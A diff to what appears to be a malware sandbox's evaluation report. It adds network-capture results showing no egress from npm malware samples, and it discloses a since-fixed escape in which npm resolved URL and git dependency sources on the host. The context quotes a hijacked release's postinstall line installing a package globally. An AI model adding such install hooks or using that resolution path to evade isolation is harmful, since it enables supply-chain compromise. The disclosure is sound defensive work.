@@ -107,6 +107,23 @@ These figures are re-scored from what the runs recorded, after a rule for bare I
 
 The third run added stand-ins for missing dependencies, and an agent that writes code against packages which looked clean. The agent alone blocked 3 of those 299.
 
+### What left the machine
+
+A sandbox reporting that it held is not evidence, so we recorded the real network card, on a throwaway Vultr VM running the same code as the site, while the 100 samples that tried the most connections ran. A test package built to get out ran alongside them. [Full numbers](evals/results/2026-11-07-network-capture.json).
+
+| What was tried | Seen on the network card |
+|---|---|
+| 250 outside hosts the malware tried to reach | 0 packets to the addresses, 0 real lookups of the names |
+| Test package, in gVisor: our own VM on five TCP ports, UDP and ping, public DNS directly, IPv6, cloud metadata, two canary names | 0 |
+| A version that stays quiet in gVisor, so the same attempts run in Firecracker | 0 |
+| Control, from the host itself: three TCP ports, UDP and a DNS lookup | All seen, so the capture would have shown a leak |
+
+400,543 packets went to 19 addresses: npm's CDN and GitHub's download host (our dependency fetch, before the package runs), Vultr Inference (model calls), Vultr DNS and time servers, and the control. npm is left out of the 250 because our own fetch uses it, and a sample's attempts on it went to the fake internet. Inside, 105 fake credentials were sent and 132 stolen-token uses were absorbed.
+
+**The first capture passed, and we repeated it.** It had no control, skipped port 22 and only ran the test package in gVisor. Asking why GitHub's download host appeared also showed a way out that no sample had tried: the fetch filters a package's own dependencies, but npm follows what those dependencies name in turn, on the host, before the sandbox. With real npm, a URL, a TLS URL and a git source each reached a local listener. The fetch now goes through [a gate](src/redhanded/egress.py) that reaches only the registry and GitHub's download host, and all three reach it zero times. The table is from after that fix. 90 of the 100 were blocked in both runs; four verdicts below or above the line moved without crossing it (three REVIEW to CLEAN, one CRITICAL to HIGH).
+
+This is one run of these samples. It does not rule out an unknown bug in gVisor, Firecracker or the kernel. A package still decides which public npm and GitHub packages we fetch, so their owners could see a download. A dependency from a GitHub source may now fail to fetch, and the package then runs without it.
+
 ### The real Cline release
 
 `cline@2.3.0` is the release pushed with a stolen npm token on 17 February 2026: one new `postinstall` line, `npm install -g openclaw@latest`. It is still downloadable, deprecated, so it can be run again.
